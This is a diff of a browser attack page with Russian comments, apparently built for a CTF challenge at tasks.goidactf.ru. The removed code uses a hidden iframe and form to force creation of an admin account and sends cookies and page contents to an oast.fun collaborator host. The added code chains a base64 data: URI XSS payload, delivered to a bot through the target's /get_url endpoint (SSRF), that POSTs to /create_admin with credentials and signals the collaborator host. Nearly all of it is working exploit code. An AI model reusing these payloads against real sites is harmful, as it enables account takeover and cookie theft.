@@ -1,48 +1,45 @@
 <!DOCTYPE html>
-<html>
-<body>
-<iframe id="targetFrame" src="https://tasks.goidactf.ru:20499/create_admin" 
-        style="display:none"></iframe>
-
-<form id="hackForm" method="POST" target="targetFrame">
-    <input type="hidden" name="new_admin_login" value="HACKED_FRAME">
-</form>
-
 <script>
+const TARGET = 'https://tasks.goidactf.ru:20499';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
-const iframe = document.getElementById('targetFrame');
 
-// Ждём загрузки iframe
-iframe.onload = function() {
-    // Отправляем форму в iframe
-    document.getElementById('hackForm').submit();
-    
-    // Через 3 секунды пытаемся прочитать iframe
-    setTimeout(() => {
-        try {
-            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-            const cookies = iframeDoc.cookie || iframe.contentWindow.document.cookie;
-            const body = iframeDoc.body.innerHTML;
-            
-            // Отправляем что нашли
-            new Image().src = `${COLLAB}/?iframe_cookies=${encodeURIComponent(cookies)}`;
-            new Image().src = `${COLLAB}/?iframe_body_len=${body.length}`;
-            
-            // Если в теле есть кука или токен
-            if (body.includes('admin_login') || body.includes('token') || body.includes('auth')) {
-                new Image().src = `${COLLAB}/?contains_creds=yes`;
-            }
-        } catch(e) {
-            new Image().src = `${COLLAB}/?iframe_error=${encodeURIComponent(e.message)}`;
-        }
-    }, 3000);
-};
+// Отправляем бота на data: URI с XSS
+const xssPayload = `
+<!DOCTYPE html>
+<script>
+// Этот код выполнится в контексте data: URI (origin null)
+// Пробуем сделать запрос к create_admin
 
-// Также вешаем обработчик на postMessage
-window.addEventListener('message', function(event) {
-    // Если iframe отправит нам сообщение
-    new Image().src = `${COLLAB}/?postmessage=${encodeURIComponent(JSON.stringify(event.data))}`;
+// Метод 1: Form
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = '${TARGET}/create_admin';
+form.innerHTML = '<input name="new_admin_login" value="DATA_URI_XSS">';
+document.body.appendChild(form);
+form.submit();
+
+// Метод 2: Fetch с credentials
+fetch('${TARGET}/create_admin', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    credentials: 'include',
+    body: 'new_admin_login=FETCH_FROM_DATA_URI'
+});
+
+// Отправляем сигнал
+new Image().src = '${COLLAB}/?from_data_uri=executed';
+<\/script>`;
+
+// Кодируем в base64 для data: URI
+const base64Payload = btoa(xssPayload);
+const dataUri = 'data:text/html;base64,' + base64Payload;
+
+// Отправляем боту через SSRF
+fetch(TARGET + '/get_url', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({url: dataUri})
+}).then(r => {
+    new Image().src = COLLAB + '/?ssrf_sent=yes';
 });
 </script>
-</body>
-</html>
